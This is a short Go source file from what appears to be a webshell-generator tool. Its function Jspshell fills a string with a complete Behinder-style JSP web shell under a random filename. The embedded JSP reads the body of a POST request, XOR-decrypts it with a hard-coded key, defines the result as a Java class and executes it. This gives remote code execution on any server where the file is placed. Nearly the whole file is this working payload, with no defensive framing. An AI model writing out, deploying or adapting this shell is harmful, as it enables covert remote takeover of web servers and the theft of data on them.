package Behinder

import "webshell/common"

func Jspshell() {
	common.Filename = common.RandStr(5)
	common.Webshells = `<%@page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*" %>
<%!
private byte[] Decrypt(byte[] data) throws Exception
{
    String key="e45e329feb5d925b"; //md5[0:16]
	for (int i = 0; i < data.length; i++) {
		data[i] = (byte) ((data[i]) ^ (key.getBytes()[i + 1 & 15]));
	}
	return data;
}
%>
<%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return
        super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            byte[] buf = new byte[512];
            int length=request.getInputStream().read(buf);
            while (length>0)
            {
                byte[] data= Arrays.copyOfRange(buf,0,length);
                bos.write(data);
                length=request.getInputStream().read(buf);
            }
            out.clear();
            out=pageContext.pushBody();
        new U(this.getClass().getClassLoader()).g(Decrypt(bos.toByteArray())).newInstance().equals(pageContext);}
%>`
}
